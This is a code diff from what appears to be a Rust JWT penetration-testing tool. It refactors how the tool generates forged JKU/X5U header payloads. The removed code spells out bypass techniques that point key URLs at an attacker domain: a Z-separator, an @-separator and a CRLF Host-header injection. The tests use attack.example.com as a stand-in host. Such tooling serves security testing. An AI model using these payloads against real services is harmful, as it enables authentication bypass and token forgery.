@@ -33,9 +33,8 @@ fn generate_payloads(
     jwk_protocol: &str,
     target: Option<&str>,
 ) -> Result<()> {
-    // Decode JWT token and extract claims
-    let decoded = jwt::decode(token)?;
-    let _claims_json = serde_json::to_string(&decoded.claims)?;
+    // Decode JWT token to validate format
+    let _ = jwt::decode(token)?;
 
     // Extract claims part from token
     let token_parts: Vec<&str> = token.split('.').collect();
@@ -96,7 +95,7 @@ fn generate_payloads(
             let spinner = utils::start_progress("Creating JKU and X5U payloads...");
 
             generate_url_payloads(
-                claims_part,
+                token,
                 jwk_trust,
                 attack_domain,
                 jwk_protocol,
@@ -227,133 +226,43 @@ fn generate_none_payloads(claims: &str, alg_value: &str) -> Result<()> {
 
 /// Creates various URL-based attack payloads using JKU/X5U header parameters
 fn generate_url_payloads(
-    claims: &str,
+    token: &str,
     jwk_trust: Option<&str>,
     jwk_attack: &str,
     jwk_protocol: &str,
     targets: &HashSet<String>,
     should_generate_all: bool,
 ) -> Result<()> {
-    let mut jku_payloads = Vec::new();
+    let mut key_types = Vec::new();
 
     if should_generate_all || targets.contains("jku") {
-        jku_payloads.push(("jku", jwk_attack.to_string()));
+        key_types.push("jku");
     }
 
     if should_generate_all || targets.contains("x5u") {
-        jku_payloads.push(("x5u", jwk_attack.to_string()));
+        key_types.push("x5u");
     }
 
-    if jku_payloads.is_empty() {
+    if key_types.is_empty() {
         return Ok(());
     }
 
-    for (key_type, domain) in jku_payloads {
-        // Generate basic URL payload with attack domain
-        let header = json!({
-            "alg": "hs256",
-            key_type: domain,
-            "typ": "JWT"
-        });
+    let payload_labels = ["Basic", "Z-Separator Bypass", "@-Separator Bypass", "CRLF Injection"];
 
-        let header_json = serde_json::to_string(&header)?;
-        info!("Generate {key_type} + basic payload header=\"{header_json}\" payload={key_type}");
+    for key_type in key_types {
+        let payloads = crate::payload::generate_url_payload(
+            token, key_type, jwk_attack, jwk_trust, jwk_protocol,
+        )?;
 
-        let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-        println!(
-            "\n{}",
-            format!("━━━ JKU/X5U Basic Payload ({key_type}) ━━━")
-                .bright_cyan()
-                .bold()
-        );
-        println!(
-            "{}.{}",
-            encoded_header.bright_blue(),
-            claims.bright_magenta()
-        );
-        println!();
-
-        // If trust domain is provided, generate URL validation bypass payloads
-        if let Some(trust_domain) = jwk_trust {
-            // Generate Z-separator URL validation bypass payload
-            let bypass_z_url = format!("{}://{}{}{}", jwk_protocol, trust_domain, "Z", jwk_attack);
-            let header = json!({
-                "alg": "hs256",
-                key_type: bypass_z_url,
-                "typ": "JWT"
-            });
-
-            let header_json = serde_json::to_string(&header)?;
-            info!(
-                "Generate {key_type} host validation payload header=\"{header_json}\" payload={key_type}"
-            );
-
-            let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
+        for (i, payload) in payloads.iter().enumerate() {
+            let label = payload_labels.get(i).unwrap_or(&"Bypass");
             println!(
                 "\n{}",
-                format!("━━━ Z-Separator Bypass Payload ({key_type}) ━━━")
+                format!("━━━ {label} Payload ({key_type}) ━━━")
                     .bright_cyan()
                     .bold()
             );
-            println!(
-                "{}.{}",
-                encoded_header.bright_blue(),
-                claims.bright_magenta()
-            );
-            println!();
-
-            // Generate @-separator URL validation bypass payload
-            let bypass_at_url = format!("{jwk_protocol}://{trust_domain}@{jwk_attack}");
-            let header = json!({
-                "alg": "hs256",
-                key_type: bypass_at_url,
-                "typ": "JWT"
-            });
-
-            let header_json = serde_json::to_string(&header)?;
-            info!(
-                "Generate {key_type} host validation payload header=\"{header_json}\" payload={key_type}"
-            );
-
-            let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-            println!(
-                "\n{}",
-                format!("━━━ @-Separator Bypass Payload ({key_type}) ━━━")
-                    .bright_cyan()
-                    .bold()
-            );
-            println!(
-                "{}.{}",
-                encoded_header.bright_blue(),
-                claims.bright_magenta()
-            );
-            println!();
-
-            // Generate CRLF-based Host header injection payload
-            let crlf_url = format!("{jwk_protocol}://{trust_domain}%0d0aHost: {jwk_attack}");
-            let header = json!({
-                "alg": "hs256",
-                key_type: crlf_url,
-                "typ": "JWT"
-            });
-
-            let header_json = serde_json::to_string(&header)?;
-            info!(
-                "Generate {key_type} host header injection (w/CRLF) payload header=\"{header_json}\" payload={key_type}"
-            );
-
-            let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-            println!(
-                "\n{}",
-                format!("━━━ CRLF Injection Payload ({key_type}) ━━━")
-                    .bright_cyan()
-                    .bold()
-            );
-            println!(
-                "{}.{}",
-                encoded_header.bright_blue(),
-                claims.bright_magenta()
-            );
+            println!("{payload}");
             println!();
         }
     }
@@ -472,8 +381,8 @@ mod tests {
 
     #[test]
     fn test_generate_url_payloads() {
-        // Create a valid payload part
-        let payload_str = "eyJzdWIiOiIxMjM0NTY3ODkwIn0";
+        // Create a test token
+        let token = create_test_token();
 
         // Create a set of targets
         let mut targets = HashSet::new();
@@ -482,7 +391,7 @@ mod tests {
 
         // Test generating url payloads
         let result = generate_url_payloads(
-            payload_str,
+            &token,
             Some("trust.example.com"),
             "attack.example.com",
             "https",
